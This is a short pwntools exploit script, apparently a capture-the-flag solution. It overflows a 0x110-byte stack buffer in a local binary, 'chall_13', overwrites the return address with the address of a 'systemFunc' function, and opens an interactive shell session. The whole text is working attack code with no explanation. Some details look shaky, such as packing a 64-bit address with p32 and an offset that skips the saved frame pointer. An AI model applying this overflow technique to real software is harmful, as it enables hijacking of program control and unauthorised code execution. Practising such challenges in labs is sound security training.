import pwn

pwn.context.arch = 'amd64'
elf = pwn.context.binary = pwn.ELF("./chall_13")

p = pwn.process(elf.path)

p.recvuntil(b"System of a doWn")

offset = 0x110 # var char *s @ stack - 0x110
payload = b"A" * offset + pwn.p32(elf.sym.systemFunc) # seems almost too easy

p.sendline(payload)

p.interactive()